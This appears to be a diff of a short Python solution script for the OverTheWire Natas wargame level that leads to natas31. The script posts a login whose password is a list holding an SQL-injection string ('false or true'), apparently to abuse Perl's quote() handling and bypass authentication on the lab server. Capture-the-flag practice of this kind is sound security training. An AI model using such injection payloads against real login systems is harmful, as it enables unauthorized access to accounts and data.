@@ -11,6 +11,6 @@ url = 'http://%s.natas.labs.overthewire.org/index.pl' % username
 
 session = requests.Session()
 
-response = session.post(url, data={"username":"natas31", "password":["'shark' or true",4]}, auth=(username,password))
+response = session.post(url, data={"username":"natas31", "password":["false or true",2]}, auth=(username,password))
 print(response.text)
 ```
